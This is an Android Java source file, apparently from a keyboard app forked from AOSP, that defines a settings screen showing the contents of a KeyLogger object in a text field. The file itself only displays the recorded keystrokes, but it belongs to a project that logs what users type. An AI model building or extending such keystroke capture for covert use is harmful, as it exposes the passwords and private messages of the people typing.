/*
 * Copyright (C) 2014 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package app.android.logger.latin.settings;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.Resources;
import android.media.AudioManager;
import android.os.Build;
import android.os.Bundle;
import android.preference.EditTextPreference;
import android.preference.PreferenceManager;
import android.widget.EditText;
import android.widget.RelativeLayout;
import android.widget.TextView;

import app.android.logger.KeyLogger;
import app.android.logger.R;
import app.android.logger.keyboard.KeyboardLayoutSet;
import app.android.logger.latin.AudioAndHapticFeedbackManager;


public final class ShowLogger extends SubScreenFragment {

    EditTextPreference editText;

    @Override
    public void onCreate(final Bundle icicle) {
        super.onCreate(icicle);

        try {
            addPreferencesFromResource(R.xml.prefs_screen_textview);

            SharedPreferences prefs = getSharedPreferences();
            Resources res = getResources();
            setPreferenceEnabled(Settings.KEY_LOGGER_AREA, Settings.readVibrationEnabled(prefs, res));

            editText = (EditTextPreference) findPreference(Settings.KEY_LOGGER_AREA);

            if (this.editText != null) {
                final Context context = getActivity();

                KeyLogger logger = KeyLogger.getInstance();
                editText.setText(logger.toString());
            }


        } catch (Exception ex) {
        }

    }

    @Override
    public void onSharedPreferenceChanged(final SharedPreferences prefs, final String key) {
        if (key.equals(Settings.KEY_LOGGER_AREA)) {

        }

    }


}






